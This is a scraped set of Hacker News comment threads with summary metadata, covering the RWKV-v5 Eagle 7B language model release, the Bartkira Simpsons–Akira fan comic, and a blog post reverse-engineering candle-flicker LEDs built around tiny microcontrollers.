(last time I checked) in practice there is one for implementation reasons. reply gdiamos 3 hours agorootparentprevThere’s a difference between the computation requirements of long context lengths and the accuracy of the model on long context length tasks. reply visarga 4 hours agoprevThis shows the model architecture, be it transformer, Mamba, SSM or RWKV - doesn't really matter when compared to the impact of the training set. We're spending too much time debating models when we should be talking about language data, a reservoir of human experience won at great sacrifice by humanity. And the same data when used to train humans creates modern capable people. Alone, without society and language, we would be mere shadows of ourselves. What does it say when AI acquires so many capabilities from language data? maybe intelligence was not centered in the brain. It's a social process. reply sanxiyn 3 hours agoparentI agree that on balance, we should spend more effort on data than modeling, but it is just not true that modeling doesn't matter. Transformer-2023 is different from Trnasformer-2020 and cumulative improvement is significant. https://arxiv.org/abs/2312.00752 did such benchmark. If choice between Transformer and RWKV doesn't seem to matter to you, the only reason is that while Transformer-2020 evolved to Transformer-2023, RWKV-v1 (which is from 2021) also evolved to RWKV-v5. If you use Transformer-2020 or RWKV-v1 today you will feel the difference. reply blackoil 3 hours agoparentprev> maybe intelligence was not centered in the brain. It's a social process. Is that controversial? We are stand on the shoulder of giants before us and that is why we insist on training younglings for couple of decades on past learnings before they are believed to be of any useful. Even the smartest person won't survive long if dropped in 10000 BC. reply jack_pp 4 hours agoparentprevOf course it is in the brain, the brain created and evolved the language as a very powerful tool. If intelligence was in the language then other animals would be as intelligent as us reply klipt 3 hours agorootparentScientific advancement requires both brains and knowledge transfer over generations. \"If I have seen further, it is by standing on the shoulders of giants.\" reply mediaman 2 hours agorootparentKnowledge transfer over generations is a function of the brain. Other species have much more limited ability to transfer knowledge intergenerationally, and that is because the human brain's capability for symbolic language is much more advanced than other animals', who are not able to encode knowledge nearly as efficiently. reply klipt 2 hours agorootparentThe point is it's a function of many connected brains, not just one brain. reply jack_pp 1 hour agorootparentSure but that's still only possible for the human brain, other species brains aren't capable of encoding knowledge and using that to collaborate with other members. reply viraptor 8 minutes agoprev> A common feedback we receive for the RWKV multi-lingual approach is: it hurts our English evaluation scores (...) Has anyone quantified that specifically? I'd love to read more details since I'd expect the concepts to start mapping between languages at some point. I.e. with enough language fluency I'd expect learning knowledge/reasoning in language to improve the result in another. But I can't find any paper talking about specifically about that. reply marmaduke 2 minutes agoparentI think the group working on rwkv has yes, even if they don't show the details in this article. (I followed them on their discord channels for quite some time). The interesting take away for me was that training rwkv from zero to intelligible sentences for minority language was more faster (in units of tokens trained!) than other architectures, making it more accessible for cases where large corpus like the Pile don't or can't exist. reply htrp 4 hours agoprev> We are releasing RWKV-v5 Eagle 7B, licensed as Apache 2.0 license, under the Linux Foundation, and can be used personally or commercially without restrictions great on the team to actually set up the right incentives for testing and adoption. reply jug 14 minutes agoprev> [Mar 2024] An MoE model based on the v5 Eagle 2T model (note, approximate date) Hyped about this! This could strike a powerful balance between performance and reasonably retained low environmental/token cost impact. Would be cool with improved coverage of Scandinavian languages along with it, but I guess we'll see. And yeah, I think a true revolution will happen (or might already be) when we realize the value of training data and how to structure and balance its content in the most optimal way for training. reply karterk 4 hours agoprevIt's interesting how all focus is now primarily on decoder-only next-token-prediction models. Encoders (BERT, encoder of T5) are still useful for generating embedding for tasks like retrieval or classification. While there is a lot of work on fine-tuning BERT and T5 for such tasks, it would be nice to see more research on better pre-training architectures for embedding use cases. reply ComplexSystems 4 hours agoprevCan someone knowledgeable about this stuff maybe explain what it means? What is the context and how does this compare to the usual transformer models? I don't get how to interpret some of these benchmarks. It looks like it's as good as Mistral 7B/mistral-tiny? reply ilaksh 3 hours agoprevForgive me for not searching around enough but so far I am not sure about: - how much RAM is needed - how many tokens per second with CPU only, like a typical VM/VPS for example reply vessenes 4 hours agoprevMy experiments with RWKV-4 showed good inference speed but suuper slow tokenization speed; I’m not sure if this was RWKV specific or implementation specific: it was some time ago. Any guidance on this for rwkv-5? reply dizhn 1 hour agoprevFYI a lot of people are asking questions which one of the project members has been answering on Reddit the last few days. https://www.reddit.com/user/PicoCreator/ reply 127361 3 hours agoprevThey've joined the Linux Foundation, does that mean the models are going to be eventually censored to satisfy the foundation's AI safety policies? That includes ensuring the models don't generate content that's non-inclusive or against diversity policies? reply pico_creator 2 hours agoparentCurrently the main policy is only around copyright - and nothing about AI safety: https://www.linuxfoundation.org/legal/generative-ai Also in the full power of opensource, if LF really force something the group disagree with, we will just fork All the other alignment policies, are optional for groups to opt-in So I would not worry so much about that - the group already has a plan in event we need to leave the Linux Foundation - for example: If USA regulates AI training (since LF is registered under USA) reply viraptor 2 hours agoparentprevDownvoted, because it's a very trolly way to ask this. Especially given the foundation doesn't have an AI safety policy from what I've seen. Let's be better than this... reply lhl 2 hours agoparentprevIt is trivial to fine tune any model (whether a base model or an aligned model) to your preferred output preferences as long as you have access to the model weights. reply Al-Khwarizmi 2 hours agorootparentNot trivial for the general public at all, and furthermore, you need much more memory for finetuning than for inference, often making it infeasible for many machine/model combinations. reply Harrisonv 2 hours agoprevTry rwkv-demo-api.recursal.ai if you want to try it and dont want to wait for gradio reply zurfer 1 hour agoparentThank you! I'm not experienced with 7B models. 3 things stand out to me: - it's absolutely not useable for the kind of use cases I solve with GPT-4 (code generation, information retrieval) - it could technically swallow a 50 page PDF, but it's not able to answer questions about it (inference speed was good, but content was garbage) - it is ok for chatting and translations (how is your day?) reply samus 2 hours agoprevHas anybody else noticed the map indicating that there are barely any fluent English speakers outside of the \"English-speaking\" countries? Or is the threshold for fluency so high that no place even in Europe except the Ireland and the UK qualify at all? reply pico_creator 28 minutes agoparentThanks for flagging that out, swapped it out with another map I found, that shows different colors for different thresholds So its not \"as strict\" reply viraptor 20 minutes agorootparentThat looks better. I think the original really was for native speakers only. Iceland is a nice quick test for that, since it should be >70% fluent in English, even with next to no native speakers. On the previous map it was almost completely white. reply Y_Y 1 hour agoparentprevEnglish is an official language in Malta and about 70% of the population is classed as \"advanced\" in English[0]. That only adds up to 280k people though, you'd probably find as many native-level speakers in any big European country, though not at the same density. [0] https://nso.gov.mt/wp-content/uploads/Skills-Preliminary.pdf reply airspresso 2 hours agoparentprevThis caught my eye as well. I interpreted it as the map only shows countries that have English as primary language. But the article was not precise enough about this. I applaud them for focusing on multilingual performance though, as that is an important area of NLP which still has lots of room for improvement. reply pico_creator 43 minutes agorootparentYea, the map is poorly generated IMO as well - sadly there is only a few online tools online i could fine that \"help me highlight, places where this list of languages is supported\" So if we want a better map, we might need to redo from scratch That being said, depending on your sources, you can find multiple citations for 15-18% of the world population support english With approximately 25% being native speaker (english as first language) and 75% as non-native [PS: i realise later we were talking about different maps, the comment is for the 2nd map, for the languages we support] reply samus 1 hour agorootparentprevI highly welcome the effort as well*, but I don't see why they would have to mistake first-language ability for fluency to argue for that. The difference is vast and relevant: anyone with good English reading and writing skills can take advantage of a model and might prefer it over a worse model in their native language. *: Just sceptical whether there's enough content out there which isn't just (often badly or too straightforwardly) translated from English. Not an issue for the languages with let's say >10 Mio. speakers, but for everything smaller. reply pico_creator 41 minutes agorootparentYea, thats why I focused only on the top 25 languages, despite the model being trained for 100+ languages. Was not confident, on the languages beyond the 25th cut-off, until we build better datasets (which we are in works on with various regional groups!) reply _hl_ 3 hours agoprevAttention is, after all, not what you need. reply adt 4 hours agoprevhttps://lifearchitect.ai/models-table/ reply black_puppydog 2 hours agoparentIIUC this model type makes the \"ALScore\" column completely pointless, because the quality of results isn't related to the number of weights in the same way as for regular transformers. reply nickthesick 4 hours agoprevIs it possible to try this out on something like llama.cpp? Does the different architecture make a difference there? reply kristjansson 4 hours agoparentThere's https://github.com/saharNooby/rwkv.cpp, which related-ish[0] to ggml/llama.cpp [0]: https://github.com/ggerganov/llama.cpp/issues/846 reply ReptileMan 1 hour agoprev [–] Their map showing distribution of English speaking people is just terrible - I am fairly sure that there is at least one percent speaking English in India, Western Europe, Eastern Europe, Russia and China. reply samus 1 hour agoparent [–] It must set a terribly high threshold (like language certificate holders or graduates of English-speaking schools) or actually report the percentage of native speakers. But one only has to be fluent enough to write chat messages to use a text model! reply GuidelinesFAQListsAPISecurityLegalApply to YCContact Search:",
    "originSummary": [
      "The RWKV open-source architecture has unveiled a new model named Eagle 7B, boasting an impressive 7.52B parameters and built on the RWKV-v5 architecture.",
      "Trained on a vast amount of data, consisting of 1.1 trillion tokens in over 100 languages, Eagle 7B surpasses all other 7B class models in multi-lingual benchmarks.",
      "Under the Apache 2.0 license, this model can be freely utilized for personal or commercial purposes without any limitations. The RWKV team aims to democratize AI, ensuring accessibility for people worldwide, and plans to extend language support in the future."
    ],
    "commentSummary": [
      "The article explores the progress and limitations of alternative LLM architectures, with a focus on the importance of context size and the suggestion to explore a larger size of ~1M tokens.",
      "The capabilities and limitations of the RWKV model, a linear attention architecture, are discussed, highlighting its perfect token recall but restricted ability to remember past tokens.",
      "The importance of language data in AI development and its role in human intelligence is emphasized, along with discussions on the RWKV-v5 Eagle 7B model, potential MoE models, tokenization speed, and concerns about potential censorship of models."
    ],
    "points": 259,
    "commentCount": 52,
    "retryCount": 0,
    "time": 1706504157
  },
  {
    "id": 39165080,
    "title": "Bartkira: The Epic Fusion of The Simpsons and Akira",
    "originLink": "http://www.bartkira.com",
    "originBody": "BARTKIRA.COMStart Reading! Artist Location Map Art Shows donate The Simpsons + Akira = BARTKIRA An original idea by Ryan Humphrey 6 Volumes DRAWn by 500+ Artists Worldwide! Start reading a volume below ! Volume 1 - Start Reading. Volume 2 - Read now Volume 3 - Read now Volume 4 - Read Now Volume 5 - Read now. Volume 6 - Start Reading ! F.A.Q Credits tumblr Tweets by @Bartkira #bartkira Tweets F.A.Q Submissions",
    "commentLink": "https://news.ycombinator.com/item?id=39165080",
    "commentBody": "Bartkira: The Simpsons and Akira (bartkira.com)242 points by tetris11 21 hours agohidepastfavorite34 comments thih9 16 hours agoInterestingly, the art styles of the artists are mostly against the “rules” of The Simpsons cartoons. Here is a popular example of these rules for reference; https://old.reddit.com/r/coolguides/comments/k2s4lq/guide_fo... ; there are more recent and more detailed ones. reply toyg 19 hours agoprevVery nice. Pretty much anything can be mapped over the Simpsons cast, simply because it's so big; but the Bart-Milhouse dynamic looks like a really good fit for Kaneda-Tetsuo. And the trailer is gorgeous - I particularly liked how it arcs back to the underground look of the very first seasons. reply animex 8 hours agoparentOr any iconic ensemble series like Family Guy & Star Wars. reply wavemode 20 hours agoprevThe \"FAQ\" page doesn't seem to be loading for me so I was terribly confused. This article actually does a great job explaining the whole story behind the project (and its status re: legality/copyright): https://www.engadget.com/2017-09-01-bartkira-volume-6-simpso... reply wavemode 20 hours agoparentThe short answer seems to be \"it's complicated\" > The team needed to tread carefully. Harvey knew that Otomo and his son, Shohei Otomo, were fans of Bartkira, and for a while Shohei was interested in getting involved with the project. James Stacey, a friend of Harvey and the owner of Tokyo, Japan-based comic publisher Black Hook Press, had been in touch with Kodansha, the company behind Young Magazine. Eventually, he received a letter that said Kodansha would never be able to endorse the project but was aware of its existence. A Bartkira book could be printed but never with the pages in sequential order, because this would create a direct competitor to Akira and give readers another, potentially cheaper way to consume Otomo's story. > \"Which was, I feel, forward-thinking of them,\" Harvey says. > It was a similar situation with Matt Groening. The Bartkira organizers knew that he had seen a copy but to date have never received a cease and desist order. As an extra defense, Harvey decided to donate all of the book's profits to charity. Some went to the OISCA Coastal Forest Restoration Project in Japan's Miyagi Prefecture, where Otomo grew up. The rest went to Save the Children, a charity preferred by the late The Simpsons co-creator Sam Simon. reply deebosong 16 hours agorootparentNever knew about these crucial behind-the-scenes talks. Really interesting to know. Thank you! reply quanto 7 hours agoprevApropos to the mixed art style: the Simpsons couch gag in the cyberpunk 80s style https://www.youtube.com/watch?v=rK-JE8vOak0 reply tetris11 20 hours agoprevThe full list of artists can be found in this doc: https://docs.google.com/spreadsheets/d/1Tn3PNewzF4t2nT9etXeq... It would have been nice if they had David Lapham in there, but you can't have everything in life reply Dwedit 16 hours agoprevSaw name, expected that character who cut the blowfish for Homer. reply everyone 18 hours agoprevIs there a downloadable version of this? Like a CBR file somewhere, for if/when it gets taken down by copyright assholes? (Also for when it's getting the hug of death as it now is.) reply tetris11 17 hours agoparenthttps://archive.org/details/bartkira/Bartkira%20v01%20%28201... reply Solvency 19 hours agoprevThe work involved is awe-inspiring but WHY — with this much effort something wholly new and original and most importantly.... SAFE from copyright lawyers could have been put into the universe. reply aidenn0 10 hours agoparentYes, all of the best artists are known for making safe choices. reply fluoridation 12 hours agoparentprevBecause it's funny. reply kevingadd 15 hours agoparentprevSometimes \"true\" wholly original creativity can only blossom after people cut their teeth by experimenting with fanworks. Few people truly start with their magnum opus. It's also the case that most successful mass market \"original\" works are thoroughly inspired by other work and exist as careful synthesis of influences with bits of inspiration and new ideas worked in. reply toyg 14 hours agorootparentYeah. Pretty much any writer, painter, musician, or performer, will gladly tell you that, when they started, they were really doing something in the style of X as best as they could. In some cases we even have proof (youthful manuscripts, recorded schoolplays, early works). That's effectively fanwork. It takes time to modulate one's original contributions to any art. reply cdelsolar 7 hours agoprevah yes, the impetuousness of youth. reply mysterypie 20 hours agoprevI don't understand the extreme amount of work that people put into works like this that could be shut down forever at the whim of the copyright holder. \"There is ongoing debate about to what extent fan fiction is permitted under contemporary copyright law. Some argue that fan fiction does not fall under fair use, as it is derivative work. The 2009 ruling by United States District Court permanently prohibiting publication in the United States of a book may be seen as upholding this position.\" [1] Unless we can greatly reduce the length of copyright terms and/or clarify that fan fiction is allowed, you might as well create only original works so your months or years of work doesn't go to waste. Update: From the link another HN user found, it says, \"The Bartkira organizers knew that Matt Groening had seen a copy but to date have never received a cease and desist order. As an extra defense, Harvey decided to donate all of the book's profits to charity [including] Save the Children, a charity preferred by the late The Simpsons co-creator Sam Simon.\" So the creators are walking on eggshells, making sure they don't earn a cent and hoping the copyright holders don't sue one day. [1] https://en.wikipedia.org/wiki/Fan_fiction#Legality reply hnlmorg 19 hours agoparentSometimes just the act of creating art is what’s important. A great example of this is Sand Mandala https://en.m.wikipedia.org/wiki/Sand_mandala Much as the hoarder inside me wishes we could preserve everything, I’m grateful that we can enjoy these temporary works even if they do just become fleeting experiences. reply hajile 19 hours agoparentprevWithout examples of why these laws are bad, they'll just continue to exist. > To promote the Progress of Science and useful Arts, by securing for limited Times to Authors and Inventors the exclusive Right to their respective Writings and Discoveries The current copyright not only does NOTHING to progress science and the arts, it actively STIFLES innovation. We need to move back to 10 years of copyright with an optional 10 year extension. reply CM30 19 hours agoparentprevPeople have interests/things they like and want to show appreciation for. Hence fan fiction, fan videos, games, mods and hacks, reanimated videos, animations, etc. Also it's worth noting that despite the memes online, the vast, vast majority of fan works are left alone and survive online for decades. The chance of a fan project actually going to waste is incredibly low, since a decent percentage of creators either like, support or don't care about fan projects based on their works, and even those that dislike them or try to shut them down only do so a minority of the time. It just sometimes doesn't appear to be the case because 'fan project in development for 10 years shut down by [large company]' is an easy to write/attention grabbing news story, in the same way 'plane explodes in mid air, no survivors found' is for the mainstream media (with similar effects on people's perception of plane safety vs car/train/whatever safety). reply famahar 19 hours agoparentprevIt's posted on the internet. Someone will always have a copy. It will always exist. And if it doesn't exist online, it will exist offline for people to look at away from the eyes of angry copyright holders. Art is eternal. reply magic_hamster 18 hours agorootparentArt might be eternal* but your access is not eternal. [*] also not eternal. reply 082349872349872 14 hours agorootparentcf самиздат reply egypturnash 15 hours agoparentprevPractice and exposure. Having fun with your friends. If you look at the spreadsheet at https://docs.google.com/spreadsheets/d/1Tn3PNewzF4t2nT9etXeq... then you'll notice that there's about four hundred people involved, most of whom did a mere two pages. That's really not a ton of work for any one artist. If you go to a comics convention you will find a ton of stuff along these lines, at a smaller scale - here's two or three things you like, put together in a funny way, maybe you'll buy that, maybe that'll draw you in to a person's table to look at their original work and become a new fan of theirs. Batman but it's Adventure Time? A DeLorean driving out of the TARDIS? Portal but it's the Muppets? Whatever. reply cmiles74 19 hours agoparentprevClearly this isn't the case here, but even having the work available for a short time might achieve the creator's goals. I'm thinking of Dudesy and their \"AI\" George Carlin impression. It certainly generated a lot of press for the podcast. https://arstechnica.com/ai/2024/01/george-carlins-heirs-sue-... As someone else pointed out, since it was posted on the internet it will be available somewhere forever. https://archive.org/details/george-carlin-im-glad-im-dead reply deebosong 16 hours agoparentprevBecause it's awesome and fun to do. And rare copies will exist for a select few to share to select parties who would absolutely love to experience the contraband underground work. reply prepend 20 hours agoparentprevPeople like things and get interested in things. I found a good exercise in learning passions and values is asking “what would you do if you knew you would fail?” So it helps learn what is really important and what you like if you knew that you would need to destroy it afterwards. reply Andrex 12 hours agoparentprevDon't look at it as wasted effort, look at it as practice for later. Applies to both fan fiction and animated fan works like Bartkira. The work is not the end for the author. reply jjulius 15 hours agoparentprev>I don't understand the extreme amount of work that people put into works like this that could be shut down forever at the whim of the copyright holder. Fun, passion, love, creativity, curiosity, so on and so forth. reply golf_mike 19 hours agoparentprevSometimes it is the doing that matters, not what was done. reply josu 19 hours agoparentprevI don't see it that different from working on open source software. I'm talking about what drives the creators, not the legality of it. reply fullshark 19 hours agoparentprevBecause they don't see it as work, but a hobby. reply msrenee 19 hours agoprev [2 more] [flagged] ajot 18 hours agoparent [–] Our friend Anna has borrowed me her cbz and cbr copies from her Archive, and MuPDF viewer[0] is great for reading those formats on my Android phone. [0] there is also MuPDF mini, but I like the latter better. reply GuidelinesFAQListsAPISecurityLegalApply to YCContact Search:",
    "originSummary": [
      "Bartkira.com is a website featuring the art project \"BARTKIRA,\" a fusion of The Simpsons and Akira.",
      "The project includes six volumes of artwork created by over 500 international artists.",
      "Users can read each volume on the website and find additional information in the FAQ section, as well as links to their Tumblr and Twitter accounts."
    ],
    "commentSummary": [
      "\"Bartkira: The Simpsons and Akira\" is a fan project that combines elements from both \"The Simpsons\" and \"Akira\" into a reimagined story.",
      "Various artists contribute to the project, depicting scenes and characters in their own art styles.",
      "The project has handled copyright challenges by donating profits to charity and has not faced any cease and desist orders so far, showcasing the creativity and passion of fan artists despite the potential risks involved."
    ],
    "points": 242,
    "commentCount": 34,
    "retryCount": 0,
    "time": 1706445226
  },
  {
    "id": 39169048,
    "title": "Candle-flicker LEDs with built-in MCUs mimic real flames, helping to conserve power",
    "originLink": "https://cpldcpu.wordpress.com/2024/01/14/revisiting-candle-flicker-leds-now-with-integrated-timer/",
    "originBody": "Revisiting Candle Flicker-LEDs: Now with integrated Timer Years ago I spent some time analyzing Candle-Flicker LEDs that contain an integrated circuit to mimic the flickering nature of real candles. Artificial candles have evolved quite a bit since then, now including magnetically actuated “flames”, an even better candle-emulation. However, at the low end, there are still simple candles with candle-flicker LEDs to emulate tea-lights. I was recently tipped off to an upgraded variant that includes a timer that turns off the candle after it was active for 6h and turns it on again 18h later. E.g. when you turn it on at 7 pm on one day, it would stay active till 1 am and deactive itself until 7 pm on the next day. Seems quite useful, actually. The question is, how is it implemented? I bought a couple of these tea lights and took a closer look. Nothing special on the outside. This is a typical LED tea light with CR2023 battery and a switch. On the inside there is not much – a single 5mm LED and a black plastic part for the switch. Amazingly, the switch does now only move one of the LED legs so that it touches the battery. No additional metal parts required beyond the LED. As prevously, there is an IC integrated together with a small LED die in the LED package. Looking top down through the lens with a microscope we can see the dies from the top. What is curious about the IC is that it rather large, has plenty of unused pads (3 out of 8 used) and seems to have relatively small structures. There are rectangular regular areas that look like memory, there is a large area in the center with small random looking structure, looking like synthesized logic and some part that look like hand-crafted analog. Could this be a microcontroller? Interestingly, also the positions of the used pads look quite familiar. The pad-positions correspond exactly to that of the PIC12F508/9, VDD/VSS are bonded for the power supply and GP0 connects to the LED. This pinout has been adopted by the ubiqitous low-cost 8bit OTP controllers that can be found in every cheap piece of chinese electronics nowadays. Quite curious, so it appears that instead of designing another ASIC with candle flicker functionality and accurate 24h timer they simply used an OTP microcontroller and molded that into the LED. I am fairly certain that this is not an original microchip controller, but it likely is one of many PIC derivatives that cost around a cent per die. Electrical characterization For some quick electrical characterization is connected the LED in series with a 220 Ohm resistor to measure the current transients. This allows for some insight into the internal operation. We can see that the LED is driven in PWM mode with a frequency of around 125Hz. (left picture) When synchronizing to the rising edge of the PWM signal we can see the current transients caused by the logic on the IC. Whenever a logic gate switches it will cause a small increase in current. We can see that similar patterns repeat at an interval of 1 µs. This suggests that the main clock of the MCU is 1 MHz. Each cycle looks slightly different, which is indicative of a program with varying instruction being executed. Sleep mode To gain more insights, I measured that LED after it was on for more than 6h and had entered sleep mode. Naturally, the PWM signal from the LED disappeared, but the current transients from the MCU remained the same, suggesting that it still operates at 1 MHz. Integrating over the waveform allows to calculate the average current consumption. The average voltage was 53mV and thus the average current is 53mV/220Ohn=240µA. Can we improve on this? This is a rather high current consumption. Employing a MCU with sleep mode would allow to bring this down significiantly. For example the PFS154 allows for around 1µA idle current, the ATtiny402 even a bit less. Given a current consumption of 240µA, a CR2023 with a capacity of 220mAh would last around 220/0.240 = 915h or 38 days. However, during the 6h it is active a current of several mA will be drawn from the battery. Assuming an average current of 2 mA, the battery woudl theoretically last 220mAh/3mA=73h. In reality, this high current draw will reduce its capacity significantly. Assuming 150mAh usable capacity of a low cost battery, we end up with around 50h of active operating time. Now lets assume we can reduce the idle current consumption from 240µA to 2µA (18h of off time per day), while the active current consumption stays the same (mA for 6h): a) Daily battery draw of current MCU: 6h*2mA + 18h*240µA = 16.3mAh b) Optimzed MCU: 6h*2mA + 18h*2µA = 12mAh Implementing a proper power down mode would therefore allows extending the operating life from 9.2 days to 12.5 days – quite a significant improvement. The main lever is the active consumption, though. Summary In the year 2023, it appears that investing development costs in a candle-flicker ASIC is no longer the most economical option. Instead, ultra-inexpensive 8-bit OTP microcontrollers seem to be taking over low-cost electronics everywhere. Is it possible to improve on this candle-LED implementation? It seems so, but this may be for another project. Share this: Twitter Facebook Like Loading... Related Author cpldcpu Posted on January 14, 2024January 28, 2024Categories candle, Hardware, Intelligent LED, LED, UncategorizedTags Candleflicker, electronics, Hardware, Light Emitting Diode, reverse engineering",
    "commentLink": "https://news.ycombinator.com/item?id=39169048",
    "commentBody": "General purpose MCUs built in to LEDs emulate candle flicker (cpldcpu.wordpress.com)211 points by pontifk8r 14 hours agohidepastfavorite139 comments exmadscientist 11 hours ago> Is it possible to improve on this candle-LED implementation? It seems so, but this may be for another project. Hey, I got paid to do this a few years back! Here's the result: https://evietealight.com/ They're the sort of thing it's not really possible to show off in a photo or even video. What really gets you (or at least gets me) is seeing these things out of the corner of your eye, flickering, just like flames flicker.... This was a pretty uncertain research project. We didn't know if we'd be able to make really convincing flameless flames. The day I knew we'd got it was the day I brought a prototype home to tune and A/B test against a real candle. I went upstairs to put the kid to bed, then came downstairs and panicked because I thought I'd left the real candle burning. I hadn't! I got fooled by my own product. It was all downhill from there. These guys are patented (somehow... the language is pretty impenetrable, and it's my own patent...) so I don't mind sharing a little of how it's done: there's an array of LEDs plus optically-active element, which shapes the light in a way that makes it look good. Nothing about this is too complicated (the optical surfaces aren't all that special, but are not trivial to prototype in your garage, at least if you've never done optics before), but there was a lot of R&D to settle in on what looks \"right\", and the final product has a lot of \"premium\" touches that really drove up the manufacturing cost. Hence the high final cost -- they really do cost a lot to make. But they look awesome! (And thanks Tim for your original article -- I definitely remember reading it during the early research phase!) reply DenisM 10 hours agoparentStill rather odd not to have a video on the page of a product where animation is the key selling point. Maybe a video wouldn’t convey all the benefits of the design, but lack of video does not inspire confidence either. reply declan_roberts 9 hours agorootparentI came here to ask for a video!! reply Wistar 4 hours agoparentprevI own six sets of Evie lights and they are the best I have ever seen. Three light sets with an induction charger sell for $75. Here is a pre-release writeup from Product Creation Studios in Seattle about the development of Evie lights. https://www.productcreationstudio.com/product-creation-glass... And, here is a short video clip of Evies “burning.” https://www.facebook.com/glassybaby/videos/2723369747740357/ reply doubloon 8 hours agoparentprevi went to a 'candle light concert' where they had a little asterisk at the bottom pointing out the candles were \"flameless\", they probably had several hundred LED candles lined up on each edge of the room as the main light source. it was pretty cool and im guessing they used those patents? reply ChuckMcM 10 hours agoprevI love it. I have noted this article for my talk about how CPUs are free. To appreciate that, you have to understand that when the first microcomputers came out engineers were still in \"compute\" mode[1], we were lectured that you wouldn't use a hard coded loop to check for a switch closure, you had to use interrupts because otherwise you were wasting all those CPU clocks. And computing at the time was often billed in weird units like \"kilocoreseconds\" (which is the number of seconds * the number of 1024 word pages of core (RAM)) that were consumed when your program ran. The logical extreme end of Moore's law was that you could put a CPU into a very, very small amount of silicon and that meant they were essentially free. (Chips cost by die area & layers). Another article like this is Bunnie Huang's discussion of the ARM CPU in flash chips[2]. There have always been jokes that it is cheaper/easier to use an 8 pin uController than it is to use a 555 timer, and the argument has often come down to the current and voltage ranges that a 555 can work under are different, but at some point I expect to finally see the \"blending\" of analog/digital chips that allow for a wide range of voltages (on board switching PMIC), and analog pins that have few if any compromises for being either digital or analog. [1] The Chip Letter -- https://thechipletter.substack.com/p/tiny-computers-from-tex... [2] On Hacking MicroSD Cards -- https://www.bunniestudios.com/blog/?p=3554 reply crote 9 hours agoparent> at some point I expect to finally see the \"blending\" of analog/digital chips that allow for a wide range of voltages The irony is that the developments which made dirt-cheap MCUs possible have at the same time basically ruled this out. Digital logic is almost trivial to scale down. With Moore's Law the compute core itself is indeed becoming basically free. However, IO does not scale down: modern chips have far fewer analog pins, far lower current limits, lower voltages, and are increasingly sensitive to ESD & over-voltage events. An ATmega32u4 from 2008 is designed to operate on 5V, can handle 40mA per pin, and has 13 analog pins. It's rather sturdy and can take quite a beating. On the other hand, the RP2040 from 2022 runs on 1.1V, although IO is 3.3V. It can only handle 12mA per pin, which a chip total of 50mA. It has only 4 analog pins, which lack a lot of protection present on the digital pins. Basically, you'll damage it if you look at it funny. I think it's best summarized by a somewhat-recent change in the USB 2.0 specification: originally the data pins were supposed to handle a 24-hour short to 5V without any issues. This requirement was dropped because such a short is incredibly rare in practice, and dropping that single requirement led to 16% reduction in silicon area for the transceiver and a 3x standby power reduction. In today's world of ever-shrinking transistors, dealing with (relatively) high voltages and analog voltages is getting more and more expensive. reply ChuckMcM 8 hours agorootparentI don't disagree at all, this analysis is spot on. The size of discretes on silicon has not shrunk nearly as much as it has for transistors. However, where I am coming from is that because the transistors have shrunk so dramatically it becomes possible to put an entire CPU in the \"left over\" space after you've placed the discretes. There was a talk at either Hot Chips or ISSC in 2011? about a mixed mode chip where the die was 2/3rds analog parts and 1/3 digital part. Xilinx, the FPGA maker, came out with the \"RF SOC\" which has a \"huge\" analog section with multiple high speed ADCs and DACs and analog reference logic, plus and FPGA fabric, plus a quad-core AARch64 CPU. As I recall Cypress had something similar but the part family is escaping me at the moment. But I am still looking for chip that integrates an SMPS so that they can run on a very wide range of voltages like the CD4000 series did (and still does). Combined with the ability to source 10's of milliamps like the ATMega and PIC chips did (and still do). reply londons_explore 3 hours agorootparentPlenty of chips integrate a voltage regulator so you can run digital logic from as much as 300 volts. Used in the controllers for some dimmable AC Led's for example. I believe the linear regulator is implemented as a large resistor followed by some zener diode or something. I assume that's so the high voltage doesn't need to touch the silicon, merely the other end of some not-very-good insulator put on top. reply KANahas 7 hours agorootparentprevThe Cypress part family you are likely thinking of is the PSoC line, it’s a MCU mixed with very configurable analog front end. reply ChuckMcM 6 hours agorootparentYeah that was what I was looking for, apparently it has an Infineon[1] part number now : https://www.infineon.com/cms/en/product/microcontroller/32-b... which is kind of cool. [1] Apparently Infineon closed their acquisition of Cypress in 2020. reply hiAndrewQuinn 2 hours agorootparentprevMade me realize that IO is the fundamental bits-atoms interface, thank you for writing. reply makerdiety 9 hours agoparentprev> I have noted this article for my talk about how CPUs are free. If teeny computers are free, and if I want to re-program them for my own use cases and personal applications, then why do I have to still spend nearly a thousand dollars or two on embedded systems development equipment like microcontroller development boards, JTAGs, ICEs, ROM flashers, UART-based bootloading solutions, and other delicate programming interfaces for small microchips, microcontrollers, and tiny computers? And don't forget microscopes to do power analysis for reverse engineering some old toy that was made to emulate or fake a real life candle's intractable flame properties.[1] If you can't write code, then what's the point? How would no code be an agent of freedom and expression? Reprogramming a microcontroller unit with a USB cable connected between it and a laptop computer is convenient. But too bad that's not really the standard for old technology and resources laying around the planet, isn't it? You have to basically be uncanny like MacGyver or inhumanly intelligent like Tony Stark to reprogram the apparently free teeny computers laying around the world. [1]: https://cpldcpu.wordpress.com/2024/01/14/revisiting-candle-f... reply ChuckMcM 8 hours agorootparentPerhaps this helps, perhaps not, but the Cortex-M architecture from ARM defines, as required, a build in debug unit. I can build a standalone JTAG/Development tool for it[1] on a $3 breakout board, and program/debug it for free using GCC. It has been a pleasant side effect of competition in the embedded space that proprietary (and expensive) tooling has become a problem for getting a chip adopted and so there is more pressure to support open source solutions. [1] Blackmagic Probe -- https://black-magic.org/ reply mlyle 4 hours agorootparentprevFirst: don't conflate NRE and tooling with the cost of something. Plastic spoons are close to free, but making a plastic spoon factory would be expensive. Second: you don't need most of that stuff. Dev boards that are a few bucks and debug probes for under $20 are credible and usable; fairly good compilers are free. > But too bad that's not really the standard for old technology and resources laying around the planet, isn't it? You have to basically be uncanny like MacGyver or inhumanly intelligent like Tony Stark to reprogram the apparently free teeny computers laying around the world. USB DFU is pretty dang common. It's not the absolutely lowest end stuff, but still pretty dang close to free. Compare to doing all of this ages ago, where you'd have an 8051 with an expensive, crummy compiler and need a lot more tooling to do anything. reply eternityforest 1 hour agorootparentprevSo many products would be better if they just used a Wemos S2 mini or similar $5 microcontroller board. I understand why everything uses custom designed stuff for cost, but I don't get why people think it's somehow the better or more \"professional\" approach to do everything yourself. Modular stuff with common high level modules is just so much easier to repair, modify, and recycle. We need an ISO standard for these little modules so we can get back to vacuum tube era level of repairability. Nearly all modern gadgets(General purpose computers and phones aside) could be made from a common set of 30 or so modules plus minimal custom stuff. reply nine_k 9 hours agoparentprevFrom the modern MCU perspective, not doing a busy wait would be about not burning the battery. Instead, it should stay in low-power mode while waiting for an interrupt. Very small controllers in a high-power device, like on a motor or a LED, don't have 